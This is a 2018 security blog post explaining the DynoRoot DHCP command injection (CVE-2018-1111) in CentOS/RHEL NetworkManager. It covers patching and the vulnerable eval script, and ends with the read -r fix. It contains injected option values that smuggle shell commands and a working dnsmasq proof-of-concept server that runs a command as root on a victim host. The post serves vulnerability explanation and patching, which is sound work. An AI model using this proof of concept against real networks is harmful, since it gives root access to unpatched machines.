<!DOCTYPE html>
<html lang="en-GB">
<head>
  <title>Floating Octothorpe: CVE-2018-1111: DHCP command injection</title>

  <meta charset="utf-8" />
  <meta name="Author" content="Floating Octothorpe" />
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="icon" type="image/png" href="/img/favicon.png" />
</head>
<body>
  <header>
    <a href="/"><img class="logo" src="/img/logo.png" alt="Floating Octothorpe logo"/></a>
    <h1 class="site-title">Floating Octothorpe</h1>
    <nav>
      <ul>
        <li><a href="/">Latest</a></li>
        <li><a href="/archive.html">Archive</a></li>
        <li><a href="/about.html">About</a></li>
      </ul>
    </nav>
  </header>
  <article>
<h1>CVE-2018-1111: DHCP command injection</h1>

<time datetime="2018-05-18">18 May 2018</time>

<p>A few days ago Red Hat patched a <a href="https://access.redhat.com/security/vulnerabilities/3442151">serious DHCP client
vulnerability</a>, the official reference is
<a href="https://access.redhat.com/security/cve/cve-2018-1111">CVE-2018-1111</a>, however it's also referred to as
<a href="https://dynoroot.ninja/">DynoRoot</a>. The flaw affects Red Hat Enterprise Linux and CentOS
systems using NetworkManager, which has been configured to obtain network
configuration via DHCP.</p>
<p>A malicious DHCP server on the local network can exploit this vulnerability to
gain full root access! If you have any CentOS or RHEL systems which use DHCP,
make sure you patch them as soon as possible.</p>
<h2>Patching affected systems</h2>
<p>Thankfully fixing vulnerable systems is very straightforward, just update the
<code>dhclient</code> package:</p>
<pre><code>yum update -y dhclient
</code></pre>
<p>Once the package is updated you can check which version you have installed
using the <code>rpm</code> command:</p>
<pre><code>$ rpm -q dhclient
dhclient-4.2.5-68.el7.centos.1.x86_64
</code></pre>
<p>The exact package will vary, Red Hat have a full list of applicable security
errata, and package versions in their <a href="https://access.redhat.com/security/cve/cve-2018-1111">CVE-2018-1111</a>
database entry. It's also possible to check the RPM change log for the fix:</p>
<pre><code>$ rpm -q --changelog dhclient | grep CVE-2018-1111
- Resolves: #1570898 - Fix CVE-2018-1111: Do not parse backslash as escape character
</code></pre>
<p>Hopefully any systems you manage should now be patched, the rest of this post
is going to go into how the vulnerability works, and what was patched to fix
it.</p>
<h2>The vulnerable script</h2>
<p><a href="https://developer.gnome.org/NetworkManager/stable/NetworkManager.html">NetworkManager</a> executes several dispatcher scripts in
response to network events, such as an interface being assigned an IP address
via DHCP. On CentOS 7 the vulnerable script,
<code>/etc/NetworkManager/dispatcher.d/11-dhclient</code> contains the following lines:</p>
<pre><code>eval "$(
declare | LC_ALL=C grep '^DHCP4_[A-Z_]*=' | while read opt; do
    optname=${opt%%=*}
    optname=${optname,,}
    optname=new_${optname#dhcp4_}
    optvalue=${opt#*=}
    echo "export $optname=$optvalue"
done
)"
</code></pre>
<p>If the network connection used DHCP for address configuration, the received
options are passed to the dispatcher script via environment variables prefixed
with <code>DHCP4_</code>, for example:</p>
<pre><code>DHCP4_HOST_NAME=foobar
</code></pre>
<p>The <code>11-dhclient</code> script then uses <a href="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html">parameter
expansion</a> to set <code>optname</code> and <code>optvalue</code> variables
to something similar to the following:</p>
<pre><code>optname=new_host_name
optval=foobar
</code></pre>
<p>Finally <code>export $optname=$optvalue</code> is evaluated for each set of variables. A
good way to get a feel for how this works is to play with the following script:</p>
<pre><code>#!/bin/bash
declare | LC_ALL=C grep '^DHCP4_[A-Z_]*=' | while read opt; do
    optname=${opt%%=*}
    optname=${optname,,}
    optname=new_${optname#dhcp4_}
    optvalue=${opt#*=}
    echo "export $optname=$optvalue"
done
</code></pre>
<p>Running this with environment variables set works as expected:</p>
<pre><code>$ DHCP4_HOST_NAME=foobar ./example.sh
export new_host_name=foobar
</code></pre>
<p>Unfortunately adding a single quote followed by a semi colon makes it possible
to add commands after the export command:</p>
<pre><code>$ DHCP4_HOST_NAME="foobar'; whoami #" ./example.sh
export new_host_name='foobar'''; whoami #'
</code></pre>
<p>The extra command will then be run after the export command is evaluated:</p>
<pre><code>$ eval "$(DHCP4_HOST_NAME="foobar'; whoami #" ./example.sh)"
root
</code></pre>
<p>In the NetworkManager dispatcher script, <code>DHCP4_</code> variables are taken directly
from the remote DHCP server, consequently they can be used to run arbitrary
commands.</p>
<h2>Exploiting the vulnerability</h2>
<p>Using the information above, it's relatively straightforward to setup a proof
of concept using <a href="http://www.thekelleys.org.uk/dnsmasq/doc.html">dnsmasq</a>:</p>
<pre><code>dnsmasq \
  --no-daemon \
  --interface=enp0s3 \
  --bind-interfaces \
  --except-interface=lo \
  --dhcp-range=192.168.100.10,192.168.100.20,1h \
  --conf-file=/dev/null \
  --dhcp-option=6,192.168.100.1 \
  --dhcp-option=3,192.168.100.1 \
  --dhcp-option="252,x'; touch /tmp/dynoroot #"
</code></pre>
<p>The command above will run a DHCP server and wait for DHCP requests:</p>
<pre><code>dnsmasq: started, version 2.76 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-i18n IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset auth no-DNSSEC loop-detect inotify
dnsmasq-dhcp: DHCP, IP range 192.168.100.10 -- 192.168.100.20, lease time 1h
dnsmasq-dhcp: DHCP, sockets bound exclusively to interface enp0s3
dnsmasq: no servers found in /etc/resolv.conf, will retry
dnsmasq: read /etc/hosts - 2 addresses
</code></pre>
<p>Any vulnerable hosts which sent a DHCP request to the server will be sent a
response:</p>
<pre><code>dnsmasq-dhcp: DHCPREQUEST(enp0s3) 192.168.100.13 08:00:27:62:41:2c
dnsmasq-dhcp: DHCPACK(enp0s3) 192.168.100.13 08:00:27:62:41:2c victim
</code></pre>
<p>The vulnerable host will then parse the DHCP options and execute
<code>touch /tmp/dynoroot</code>:</p>
<pre><code>[root@victim]# ls /tmp/dynoroot
/tmp/dynoroot
</code></pre>
<p>This example is relatively harmless, however the payload could obviously be
changed.</p>
<h2>Fixing the script</h2>
<p>Fixing the vulnerable script is actually very straightforward, below is a fixed
version of <code>example.sh</code>:</p>
<pre><code>#!/bin/bash
declare | LC_ALL=C grep '^DHCP4_[A-Z_]*=' | while read -r opt; do
    optname=${opt%%=*}
    optname=${optname,,}
    optname=new_${optname#dhcp4_}
    optvalue=${opt#*=}
    echo "export $optname=$optvalue"
done
</code></pre>
<p>The only change made to the script above was adding the <code>-r</code> option to <code>read</code>.
This does the following:</p>
<blockquote>
<p>Backslash does not act as an escape character.  The backslash is considered
to be part of the line.  In particular, a backslash-newline pair may not be
used as a line continuation.</p>
</blockquote>
<p>Once backslashes are no longer treated as escape characters, it's no longer
possible to terminate the export command:</p>
<pre><code>$ DHCP4_HOST_NAME="foobar'; whoami #" ./example.sh
export new_host_name='foobar'''; whoami #'

$ eval "$(DHCP4_HOST_NAME="foobar'; whoami #" ./example.sh)"
$ echo $new_host_name
foobar'; whoami #
</code></pre>
  </article>
  <footer class="footer pure-u-1 pure-u-md-3-4">
    <hr />
    <small>
      Copyright &copy; 2020 Floating Octothorpe. Except where
      otherwise noted, content on this site is licensed under a
      <a rel="license"
         href="https://creativecommons.org/licenses/by/4.0/">Creative Commons
          Attribution 4.0 License</a>.
    </small>
  </footer>
</body>
</html>